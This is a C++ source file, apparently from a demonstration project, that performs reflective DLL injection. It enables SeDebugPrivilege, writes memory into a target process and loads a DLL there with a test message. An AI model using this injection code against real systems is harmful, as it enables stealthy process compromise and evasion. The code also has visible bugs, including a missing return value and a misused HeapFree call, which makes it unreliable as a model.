#include "ReflectiveDLLInjection.h"
#include "ReflectiveLoadLibrary.h"
#include "ReflectiveGetProcAddress.h"
#include "CodeInjection.h"

#pragma comment(lib,"Advapi32.lib")

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s Error=%d", e, GetLastError() ); break; }

typedef struct __TestFunctionProcParam
{
	FARPROC TestFunctionAddr;
	PWSTR message[1024];
} TestFunctionProcParam, *PTestFunctionProcParam;



DWORD TestFunctionProc(LPVOID lparam)
{
	auto param = (PTestFunctionProcParam)lparam;
	((TestFunction)param->TestFunctionAddr)((LPVOID)param->message);
	return 0;
}

BOOL Reflective_DLLInjection(DWORD pid, HANDLE process, LPWSTR moduleName)
{
	using namespace std;

	HANDLE dllFile = CreateFileW(moduleName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (dllFile == INVALID_HANDLE_VALUE)
	{
		wcout << "[ReflectiveDLLInjection] DLL file unavailable: " << moduleName << " error code " << GetLastError() << '\n';
		return FALSE;
	}

	DWORD dllFileSize = GetFileSize(dllFile, nullptr);
	if (!dllFileSize || dllFileSize == INVALID_FILE_SIZE)
	{
		wcout << "[ReflectiveDLLInjection] DLL file size unavailable error code " << GetLastError() << '\n';
		return FALSE;
	}

	HANDLE heap = HeapAlloc(GetProcessHeap(), 0, dllFileSize);
	wcout << "[ReflectiveDLLInjection] Heap allocation " << heap << " / error code " << GetLastError() << '\n';
	if (!heap)
		return FALSE;

	BOOL state = ReadFile(dllFile, heap, dllFileSize, nullptr, nullptr);
	wcout << "[ReflectiveDLLInjection] Read DLL to memory / error code " << GetLastError() << '\n';
	if (!state)
	{
		return FALSE;
	}

	HANDLE tokenHandle = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
	{
		TOKEN_PRIVILEGES privToken = { 0 };
		privToken.PrivilegeCount = 1;
		privToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &privToken.Privileges[0].Luid))
			AdjustTokenPrivileges(tokenHandle, FALSE, &privToken, 0, NULL, NULL);

		CloseHandle(tokenHandle);
	}
	cout << "[ReflectiveDLLInjection] Acquire SeDebugPrivilege / error code " << GetLastError() << '\n';

	LPVOID paramMem = VirtualAllocEx(process, nullptr, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PWCHAR msg = new WCHAR[1024];
	wcscpy_s(msg, 1024, L"Reflection DLL injection, Whoa!");
	WriteProcessMemory(process, paramMem, msg, 1024 * sizeof(WCHAR), nullptr);
	delete[]msg;

	auto myModuleBase = (HMODULE)LoadRemoteLibraryR(process, heap, dllFileSize, "ReflectiveLoader", paramMem);
	cout << "[ReflectiveDLLInjection] Injection -> loaded at base " << myModuleBase << " / error code " << GetLastError() << '\n';
	if (!myModuleBase)
		return FALSE;

	HeapFree(heap, 0, nullptr);
}
